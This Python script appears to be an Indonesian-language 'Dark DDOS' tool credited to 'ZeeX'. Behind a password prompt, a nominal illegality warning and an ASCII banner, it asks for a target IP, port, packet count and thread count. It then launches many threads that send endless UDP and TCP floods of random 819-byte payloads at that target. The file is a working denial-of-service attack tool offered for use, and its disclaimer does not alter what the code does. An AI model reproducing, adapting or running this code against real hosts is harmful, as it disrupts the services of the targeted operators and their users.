import random
import socket
import threading
import os,sys
import time

os.system("clear")
password = "ZeeX"

for i in range(3):
	pwd = input("\033[1;31;40m[•]PASSWORD : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[1;32;40m[✓]PASSWORD BENAR ")
		break
	else:
		time.sleep(5)
		print("[×] Password Salah!!! ")
		continue
time.sleep(5)
os.system("clear")
print("\u001b[31m{√} Baca Bentar Bang!")
print("""\u001b[31m
|              WARNING!!!!               |
|                                        |
|DDOS MERUPAN HAL YANG ILEGAL KALAU LU   |
|ABUSE TANGGUNG SENDIRI AKIBAT NYA GUA   |
|GAK NAKUT NAKUTIN GUA CUMA PERINGATIN   |
|OKE JANGAN SAMPAI KALIAN ABUSE YA       |
|AUTHOR : ZEEX                           |""")
print("[•]Tunggu 5 Detik Bang")
time.sleep(5)
os.system("clear")
print("\033[1;32;40m>> TOOLS BY ZEEX <<")
time.sleep(1)
print("\033[1;32;40m>> DONT ABUSE TOOLS <<")
time.sleep(1)
print("\033[1;32;40m>> Join My Community <<")
time.sleep(3)
os.system("clear")
print("""\033[95m
  ____             _                           
 |  _ \  __ _ _ __| | __                       
 | | | |/ _` | '__| |/ /____                   
 | |_| | (_| | |  |   <_____|                  
 |____/ \__,_|_|  |_|\_\           _ _         
  / ___|___  _ __ ___  _   _ _ __ (_) |_ _   _ 
 | |   / _ \| '_ ` _ \| | | | '_ \| | __| | | |
 | |__| (_) | | | | | | |_| | | | | | |_| |_| |
  \____\___/|_| |_| |_|\__,_|_| |_|_|\__|\__, |
                                         |___/ """)
ip = str(input("\033[92mDark DDOS | \033[93mHOST/IP ====> : \033[91m"))
port = int(input("\033[92mDark DDOS | \033[93mPORT ====> : \033[91m"))
choice = str(input("\033[92mDark DDOS | \033[93mGAS Method ====> : \033[91m"))
times = int(input("\033[92mDark DDOS | \033[93mPAKET ====> : \033[91m"))
threads = int(input("\033[92mDark DDOS | \033[93mTHREAD ====> : \033[91m"))
def run():
    data = random._urandom(819)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print("\033[91mATTACK TO IP \033[36m%s \033[91mAND PORT \033[36m%s"%(ip,port))
        except:
            print("\033[91mRECONECT")

def run2():
    data = random._urandom(819)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("\033[91mATTACK TO IP \033[36m%s \033[91mAND PORT \033[36m%s"%(ip,port))
        except:
            s.close()
            print("\033[91mRECONECT")

def run3():
    data = random._urandom(819)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("\033[91mATTACK TO IP \033[36m%s \033[91mAND PORT \033[36m%s"%(ip,port))
        except:
            s.close()
            print("\033[91mRECONECT")

                
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
    else:
        th = threading.Thread(target = run3)
        th.start()